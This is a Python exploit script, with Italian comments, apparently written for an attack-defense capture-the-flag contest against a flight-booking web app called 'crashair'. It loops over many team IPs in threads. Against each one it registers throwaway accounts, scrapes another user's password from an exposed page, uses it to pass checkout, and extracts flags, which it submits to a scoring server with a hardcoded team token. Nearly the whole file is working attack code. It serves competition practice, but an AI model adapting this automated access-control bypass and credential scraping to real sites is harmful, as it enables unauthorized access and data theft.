#/usr/bin/python3

import requests, time, re, string, random
from threading import Thread, Lock

TEAM_TOKEN = "ddfe3c79ffdb518891f4f82ea90b433f"			# TEAM_TOKEN INVIATO PER EMAIL
CHALLENGE_NAME = "crashair"								# NOME DELLA CHALLENGE INDICATO IN flagIds

flags = []
threads = []
lock = Lock()

def generate_random_string(length):
    # choose from all lowercase letter
    letters = string.ascii_lowercase
    result_str = ''.join(random.choice(letters) for i in range(length))
    return result_str

class Attacker(Thread):
	def __init__(self, ip, flagids):
		Thread.__init__(self)
		self.ip = ip
		self.flagids = flagids
		

	def run(self):
		flag_list = []
		for hint in self.flagids[CHALLENGE_NAME][self.ip]:
			try:
				flag = get_flag(self.ip, hint)
				print(flag)
			except Exception as e:
				print("ERR: {}".format(e))
				continue
			if flag not in flag_list:
				flag_list.append(flag)
	
		lock.acquire()
		flags.extend(flag_list)
		lock.release()


def exploit(flagids):
	c = 1
	i = 0
	size = len(flagids[CHALLENGE_NAME])
	for ip in flagids[CHALLENGE_NAME]:
		print(f"{ip}\t-\t{c} / {size} ...")

		threads.append(Attacker(ip, flagids))
		threads[i].start()

		i += 1
		c += 1
	
	for i in range(size):
		threads[i].join()
			
	
def get_flag(ip, hint):
	session = requests.Session()
	username = generate_random_string(8)
	password = generate_random_string(8)

	# REGISTRAZIONE
	data = {"username": username, "password": password}
	resp = session.post(f"http://{ip}:8000/register", data=data, timeout=1)
	
	# GET OPTIONAL BY ID PER PRENDERE LA RELATIVA PASSWORD
	resp = session.get(f"http://{ip}:8000/optionals/{hint}", timeout=1)
	password = re.findall("value=\".*", resp.text)[3][7:-2]
	
	# POST RESERVATION
	data = {"seat_reservation": 1, "online_checkin": 1, "optional_id": hint}
	resp = session.post(f"http://{ip}:8000/reservations", data=data, timeout=1)
	
	# GET CHECKOUT PER PRENDERE L'ID ASSEGNATO ALLA PRENOTAZIONE
	resp = session.get(f"http://{ip}:8000/checkout", timeout=5)
	id_reservation = re.findall("<th scope=\"row\">[0-9]+", resp.text)[0].split(">")[1]

	# GET CHECKOUT BY id_reservation
	resp = session.get(f"http://{ip}:8000/checkout/{id_reservation}", timeout=1)
	
	# INSERISCI PASSWORD PER IL CHECKOUT
	data = {"password": password}
	resp = session.post(f"http://{ip}:8000/checkout/check_pwd", data=data, timeout=1)

	# SLEEP NECESSARIA PER LA GENERAZIONE DEL TICKET
	time.sleep(2)
	
	# GET TICKETS
	resp = session.get(f"http://{ip}:8000/ticket", timeout=1)
	
	# GET FLAG
	flag = re.findall("[A-Z0-9]{31}=", resp.text)[0]
	return flag
	


## TEST get_flag
# hint = 321
# flag = get_flag("10.60.39.1", hint)
# print(flag)
# exit()



# EXPLOIT FINALE
while True:
	flags = []
	threads = []

	print("Running exploit...")
	flagids = requests.get("http://10.10.0.1:8081/flagIds").json()
	exploit(flagids)
	print(flags)


	print("Putting flags...")
	r = requests.put('http://10.10.0.1:8080/flags', headers={'X-Team-Token': TEAM_TOKEN}, json=flags).text
	print(r)
	print("Exploit ok...\nRepeat...")
	print("\n")

	time.sleep(30)


